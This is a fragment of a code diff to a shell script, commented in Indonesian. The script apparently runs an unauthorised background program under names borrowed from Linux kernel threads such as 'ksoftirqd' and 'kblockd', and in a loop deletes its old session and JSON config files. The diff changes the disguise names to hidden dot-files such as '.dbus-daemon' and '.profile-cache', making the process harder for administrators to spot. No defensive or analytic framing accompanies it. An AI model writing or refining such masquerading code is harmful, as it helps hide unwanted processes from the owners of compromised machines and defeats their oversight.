@@ -9,7 +9,7 @@ CONFIG_JSON='{
 }'
 
 # Daftar nama proses Linux core yang lebih beragam
-POSSIBLE_NAMES=("chrome" "migration" "watchdog" "ksoftirqd" "rcu_sched" "mozila" 
+POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                 "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")
 
 # Lokasi penyimpanan
@@ -25,12 +25,12 @@ generate_random_string() {
 while true; do
     # Hapus data sesi lama termasuk config
     rm -f "$LOCAL_BIN_DIR"/*.json
-    rm -f "$LOCAL_BIN_DIR"/chrome*
+    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon*
     rm -f "$LOCAL_BIN_DIR"/migration*
     rm -f "$LOCAL_BIN_DIR"/watchdog*
-    rm -f "$LOCAL_BIN_DIR"/ksoftirqd*
+    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd*
     rm -f "$LOCAL_BIN_DIR"/rcu_*
-    rm -f "$LOCAL_BIN_DIR"/mozila*
+    rm -f "$LOCAL_BIN_DIR"/.profile-cache*
     rm -f "$LOCAL_BIN_DIR"/kdevtmpfs*
     rm -f "$LOCAL_BIN_DIR"/kintegrityd*
     rm -f "$LOCAL_BIN_DIR"/kblockd*
